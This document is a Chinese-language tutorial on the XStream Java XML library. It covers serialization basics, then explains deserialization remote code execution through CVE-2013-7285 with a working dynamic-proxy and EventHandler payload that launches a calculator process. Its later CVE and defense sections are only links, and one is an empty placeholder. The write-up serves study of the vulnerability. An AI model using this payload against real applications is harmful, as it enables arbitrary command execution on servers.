# xstream漏洞检测与利用
# **XStream Basics**
在描述攻击之前，让我们回顾一下XStream的一些基础知识。XStream是一个XML序列化库，可以在Java类型和XML之间进行转换。考虑一个简单的Person类：
```java
public class Person {
    @XStreamAlias("firstName") //别名注解
    private String firstName;
    @XStreamAlias("lastName")
    private String lastName;
    @XStreamAlias("address")
    private Address address;
    // 省略get和set函数
}
class Address{
    @XStreamAlias("国")
    private String country;
    @XStreamAlias("省")
    private String province;
    @XStreamAlias("市")
    private String city;
    // 省略get和set函数
}
```
## **由Object生成XML：**
```java
Person person = new Person();
person.setFirstName("jack");
person.setLastName("Ma");
Address address = new Address();
address.setCountry("China");
address.setProvince("ZheJiang");
address.setCity("HangZhou");
person.setAddress(address);
XStream xstream=new XStream();
//XStream xstream=new XStream(new DomDriver()); //直接用jaxp dom来解释
//XStream xstream=new XStream(new DomDriver("utf-8")); //指定编码解析器,直接用jaxp dom来解释
////如果没有这句，xml中的根元素会是<包.类名>；或者说：注解根本就没生效，所以的元素名就是类的属性
xstream.processAnnotations(person.getClass()); //通过注解方式的，一定要有这句话
//将某一个类的属性，作为xml节点的属性，而不是子节点
xstream.useAttributeFor(Address.class, "country");
String xml = xstream.toXML(person);
System.out.println(xml);
-----------------------------------------输出---------------------------------------------
<person>
  <firstName>jack</firstName>
  <lastName>Ma</lastName>
  <address 国="China">
    <省>ZheJiang</省>
    <市>HangZhou</市>
  </address>
</person>
```
在这两种情况下，XStream都使用Java反射将Person类型转换为XML或从XML转换为Person类型。攻击发生在读取XML期间。在读取XML时，XStream使用反射实例化Java类。

## **由XML生成Object：**
```java
 String testXMl = "<person>\n" +
                "  <firstName>jack</firstName>\n" +
                "  <lastName>Ma</lastName>\n" +
                "  <address 国=\"China\">\n" +
                "    <省>ZheJiang</省>\n" +
                "    <市>HangZhou</市>\n" +
                "  </address>\n" +
                "</person>";
XStream xstream = new XStream(new DomDriver());
xstream.useAttributeFor(Address.class, "country");
xstream.processAnnotations(Person.class);
Person obj = (Person)xstream.fromXML(testXMl);
System.out.println(obj);
-----------------------------------------输出---------------------------------------------
[firstName = jack,lastName = Ma,address = [country = China,province = ZheJiang,city = HangZhou]
```
## **别名配置的方式**
别名是我们希望用于元素的名称，而不是使用默认名称。例如，我们可以通过注册Customer类的别名将com.baeldung.pojo.Customer替换为Customer。我们还可以为类的属性添加别名。通过使用别名，我们可以使XML输出更具可读性。
### **Class 别名**
通过编程或使用注释向XStream实例注册别名，可以用@XStreamAlias注解别名：
```java
//采用这种方式的时候，需要注意xStream实例化的时候，加上 xStream.processAnnotationsPerson.class);配置。
@XStreamAlias("customer")
public class Customer{
  //.......
}
//或者可以以编程方式配置别名，可以使用以下代码：
xstream.alias("customer", Customer.class);
```
### **Field 别名**
可以为类的字段添加别名。例如，如果希望在XML表示中用fn替换字段firstName，可以使用以下注释：
```java
@XStreamAlias("fn")
private String firstName;
//或者可以以编程方式为类的字段配置别名，可以使用以下代码：
xstream.aliasField("fn", Customer.class, "firstName");
```
### **XStream默认别名**
XStream为一些常用类预先注册了几个别名：
```java
alias("float", Float.class);
alias("date", Date.class);
alias("gregorian-calendar", Calendar.class);
alias("url", URL.class);
alias("list", List.class);
alias("locale", Locale.class);
alias("currency", Currency.class);
alias("sorted-set", SortedSet.class); // 后面的POC中出现
.......
```
### **Implicit Collections（隐式集合）**
假设我们有以下XML，包含一个简单的ContactDetails列表:
```xml
<customer>
    <firstName>John</firstName>
    <lastName>Doe</lastName>
    <dob>1986-02-14 04:14:20.541 UTC</dob>
    <ContactDetails>
        <mobile>6673543265</mobile>
        <landline>0124-2460311</landline>
    </ContactDetails>
    <ContactDetails>...</ContactDetails>
</customer>
```
我们希望将ContactDetails列表加载到Java对象的list<ContactDetails>字段中。我们可以通过使用以下注释来实现这一点：
```java
@XStreamImplicit
private List<ContactDetails> contactDetailsList;
//或者，可以通过编程实现相同的目的：
xstream.addImplicitCollection(Customer.class, "contactDetailsList");
```
### **Ignore Fields（忽略字段）**
XStream在实施xml to object的时候碰到无法识别字段会抛出异常。要解决此问题，需要将其配置为忽略未知元素：
```java
xstream.ignoreUnknownElements();
```
### **Attribute Fields（属性字段）**
假设要将带有属性的XML作为元素的一部分，并将其序列化或反序列化为对象中的字段。可将ContactDetails对象添加contactType属性：
```xml
<ContactDetails contactType="Office">
    <mobile>6673543265</mobile>
    <landline>0124-2460311</landline>
</ContactDetails>
```
如果我们想反序列化contactType XML属性，我们可以在希望它出现的字段上使用@XStreamAsAttribute注释：
```java
@XStreamAsAttribute
private String contactType;
//或者，可以通过编程实现相同的目的：
xstream.useAttributeFor(ContactDetails.class, "contactType");
```
### **Omitting Fields（省略字段）**
Xstream在生成XML的过程中可忽略自定的字段：
```java
@XStreamOmitField 
private String firstName;
//In order to omit the field programmatically, we use the following method:
xstream.omitField(Customer.class, "firstName");
```
### **其他特性**
* 指定类成员属性别名，用 aliasAttribute(Class definedIn, String attributeName, String alias)，单独命名没有意义，还要通过useAttributeFor(Class definedIn, String fieldName) 应用到某个类上。如：将Person的firstName指定为XML属性并用别名表示。
* XStream默认当String类型的属性值为null时不封装到xml中。可以根据实际传xml情况，选择对象属性set空字符串还是null。

## **Converters（XStream 转换器）**
XStream本身定义了很多转换器实例，每个实例都有自己的转换策略，这些策略提供将对象数据转换为XML中的特定格式或者将XML转换回对象数据。除了使用默认转换器，我们还可以修改默认值或注册自定义转换器。
### **Modifying an Existing Converter（修改转换器）**
```java
// 1. Modifying an Existing Converter
// 假设我们不满意使用默认设置生成dob标记的方式，我们可以修改XStream（DateConverter）提供的日期的自定义转换器：
xstream.registerConverter(new DateConverter("dd-MM-yyyy", null));
// 以上的配置将产生“dd-MM-yyyy” 的日期格式:
<customer>
    <firstName>John</firstName>
    <lastName>Doe</lastName>
    <dob>14-02-1986</dob>
</customer>
```
### **Custom Converters（自定义转换器）**
我们还可以创建一个自定义转换器，以实现与上一节相同的输出：
```java
public class MyDateConverter implements Converter {

    private SimpleDateFormat formatter = new SimpleDateFormat("dd-MM-yyyy");

    @Override
    public boolean canConvert(Class clazz) {
        return Date.class.isAssignableFrom(clazz);
    }

    @Override
    public void marshal(Object value, HierarchicalStreamWriter writer, MarshallingContext arg2) {
        Date date = (Date)value;
        writer.setValue(formatter.format(date));
    }

    // other methods
}
// 最后，我们注册MyDateConverter类如下：
xstream.registerConverter(new MyDateConverter());
```
# **How the Attack Works**
XStream实例化的类由它解析的XML元素的名称决定。
因为我们将XStream配置为知道Person类型，所以XStream在解析名为“Person”的XML元素时会实例化一个新的Person。
除了Person这样的用户定义类型之外，XStream还可以即时识别核心Java类型。例如，XStream可以从XML读取映射：
```java
String xml = "" 
    + "<map>" 
    + "  <element>" 
    + "    <string>foo</string>" 
    + "    <int>10</int>" 
    + "  </element>" 
    + "</map>";
XStream xStream = new XStream();
Map<String, Integer> map = (Map<String, Integer>) xStream.fromXML(xml);
```
XStream读取表示核心Java类型的XML的能力将有助于远程代码执行攻击的利用。

## **构造攻击代码(CVE-2013-7285)**
```java
new ProcessBuilder().command("cmd.exe /c calc").start();
```
XStream只调用构造函数和设置字段，因此，攻击者无法直接调用ProcessBuilder.start()方法。但是，安全研究员Dinis Cruz在他们的博客文章中向我们展示了他们如何使用Comparable接口来调用攻击代码。利用Java动态代理来动态地创建一个可比较的实例，同时实现Comparable接口，设置代理的handler为Java的EventHandler，EventHandler类为攻击者提供了一个可配置的InvocationHandler实现，攻击者将EventHandler配置为调用ProcessBuilder的start()方法。将这些组件放在一起得到动态代理的XML表示：
```xml
<dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
        <target class="java.lang.ProcessBuilder">
            <command>
                <string>open</string>
                <string>/Applications/Calculator.app</string>
            </command>
        </target>
        <action>start</action>
    </handler>
</dynamic-proxy>
```
为了强制构建的proxy调用compare方法，通过构建一个可排序的集合TreeSet来触发两个可比较的实例进行比较，Payload如下：
```xml
<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>calc</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>
```
最终，当XStream读取这个XML时，攻击就会发生：
```java
String payload = // XML from above
XStream xstream = new XStream();
xstream.fromXML(payload);
```
### **攻击流程总结**
让我们总结一下XStream在反序列化这个XML时触发的大致调用过程：
* 步骤一：XStream调用TreeSet构造函数，设置字符“foo”和创建的代理对象。
* 步骤二：TreeSet构造函数调用实现Comparable接口的Proxy对象的compareTo方法来确定集合中各项的顺序。
* 步骤三：Proxy对象将所有的方法调用委托给EventHandler。
* 步骤四：EventHandler在其invokeInternal函数中调用配置ProcessBuilder的start()方法。
* 步骤五：ProcessBuilder派生一个新进程，运行攻击者希望执行的命令。

# **XStream 远程代码执行漏洞（CVE-2019-10173）**
https://paper.seebug.org/1417/
# **XStream 远程代码执行漏洞（CVE-2020-26217）**
https://paper.seebug.org/1417/
https://www.cnblogs.com/v1ntlyn/p/14034019.html
# **XStream 远程代码执行漏洞（CVE-2021-XXXXX）**

# **防御总结**
http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/

https://blog.csdn.net/weixin_39635657/article/details/111104938
# **参考**
Xstream特性：
https://www.baeldung.com/xstream-deserialize-xml-to-object

https://www.baeldung.com/xstream-serialize-object-to-xml

Xstream反序列化原理：
https://blog.csdn.net/weixin_39635657/article/details/111104938

XStream 组件高危漏洞分析与利用：
https://paper.seebug.org/1417/

Remote Code Execution with XStream：
https://www.baeldung.com/java-xstream-remote-code-execution

http://www.pwntester.com/blog/2013/12/23/rce-via-xstream-object-deserialization38/

远程代码执行漏洞复现：
https://www.jianshu.com/p/b600b6281aff

Xstream反序列化远程代码执行漏洞深入分析：
https://www.freebuf.com/articles/web/268553.html
